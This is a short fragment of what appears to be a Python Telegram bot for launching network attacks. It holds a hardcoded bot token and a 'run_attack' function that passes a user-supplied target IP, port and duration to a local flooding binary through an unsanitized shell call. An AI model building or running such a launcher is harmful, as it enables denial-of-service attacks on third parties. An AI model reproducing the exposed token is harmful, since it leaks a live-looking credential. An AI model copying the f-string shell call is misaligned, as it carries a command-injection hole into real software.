...
# Configuration
TOKEN = '7581242120:AAECD0DyAS-M4HV5YXYrLyFfXKYd1XvNId8'
...
async def run_attack(target_ip, target_port, duration):
    ...
    try:
        process = await asyncio.create_subprocess_shell(f"./Rahul {target_ip} {target_port} {duration} 100")
